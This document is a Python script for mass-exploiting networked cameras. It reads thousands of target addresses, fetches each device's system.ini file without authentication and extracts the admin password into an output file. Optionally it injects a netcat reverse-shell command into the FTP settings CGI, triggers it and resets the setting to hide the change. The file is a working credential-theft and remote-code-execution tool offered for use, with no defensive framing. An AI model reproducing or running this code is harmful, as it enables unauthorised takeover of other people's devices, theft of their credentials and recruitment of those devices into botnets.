#!/usr/bin/python
import asyncio
import aiohttp
import sys

if len(sys.argv) < 3:
    print("\x1b[0;37mCorrect usage: python3 " + sys.argv[0].split("\\").pop() + " <input file> <output file> [exploit_ip] [exploit_port]")
    sys.exit()

finalprintout = ""
timeout = 1000
total = 0
exploit_enabled = False
exploit_ip = ""
exploit_port = ""

if len(sys.argv) >= 5:
    exploit_enabled = True
    exploit_ip = sys.argv[3]
    exploit_port = sys.argv[4]
    print(f"[*] Exploitation enabled - Reverse shell to {exploit_ip}:{exploit_port}")

inputfile = sys.argv[1]
outputfile = sys.argv[2]

with open(inputfile, "r") as f:
    scan = f.read().splitlines()

scan = [line for line in scan if line.strip()]
pretotal = len(scan)

async def exploit_target(session, ip, port, password):
    try:
        reverse_shell = f"$(nc {exploit_ip} {exploit_port} -e /bin/sh %26)"
        set_url = f"http://{ip}:{port}/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas={password}&svr={reverse_shell}&port=21&user=test&pwd=test&dir=/&mode=0&upload_interval=0"

        async with session.get(set_url, timeout=timeout) as response:
            await asyncio.sleep(0.5)
            test_url = f"http://{ip}:{port}/ftptest.cgi?next_url=test_ftp.htm&loginuse=admin&loginpas={password}"
            async with session.get(test_url, timeout=timeout) as test_response:
                print(f"[+] Exploit sent to {ip}:{port} - Response: {test_response.status}")

                reset_url = f"http://{ip}:{port}/set_ftp.cgi?next_url=ftp.htm&loginuse=admin&loginpas={password}&svr=1&port=21&user=&pwd=&dir=/&mode=0&upload_interval=0"
                async with session.get(reset_url, timeout=timeout) as reset_response:
                    pass
    except Exception as e:
        print(f"[-] Exploit failed for {ip}:{port}: {e}")

async def check_target(session, target):
    global total, finalprintout
    try:
        if ":" in target:
            ip, port = target.split(":", 1)
            target_url = f"http://{ip}:{port}/system.ini?loginuse&loginpas"
        else:
            ip = target
            port = "80"
            target_url = f"http://{ip}/system.ini?loginuse&loginpas"

        async with session.get(target_url, timeout=timeout) as response:
            content = await response.read()
            reply = str(content)

            if "admin" in reply:
                admin_index = reply.find('admin')
                reply_after_admin = reply[admin_index:]
                reply_after_admin = reply_after_admin.replace("\\x00", "")

                password_end_chars = ['\\', '/', '"', "'", '<']
                password_end = len(reply_after_admin)

                for char in password_end_chars:
                    pos = reply_after_admin.find(char, 5)
                    if pos != -1 and pos < password_end:
                        password_end = pos

                password = reply_after_admin[5:password_end]
                password = ''.join(c for c in password if c.isprintable())

                if password and len(password) > 0:
                    print(f"[+] Found     admin:{password}@{ip}:{port}")
                    finalprintout += f"{ip}:{port}:admin:{password}\n"
                    total += 1

                    if exploit_enabled:
                        await exploit_target(session, ip, port, password)

    except Exception as e:
        pass

async def process_batch(session, batch):
    tasks = [check_target(session, target) for target in batch]
    await asyncio.gather(*tasks)

async def main():
    connector = aiohttp.TCPConnector(limit=9000, limit_per_host=9000)
    async with aiohttp.ClientSession(connector=connector) as session:
        batch_size = 9000
        for i in range(0, len(scan), batch_size):
            batch = scan[i:i + batch_size]
            print(f"Processing batch {i//batch_size + 1}/{(len(scan)+batch_size-1)//batch_size} ({len(batch)} targets)")
            await process_batch(session, batch)
            await asyncio.sleep(1)

print("Dumping Credentials...")
asyncio.run(main())

with open(outputfile, "w") as f:
    f.write(finalprintout)

print(f"{total} out of {pretotal} ({round((total/pretotal)*100)}%)")
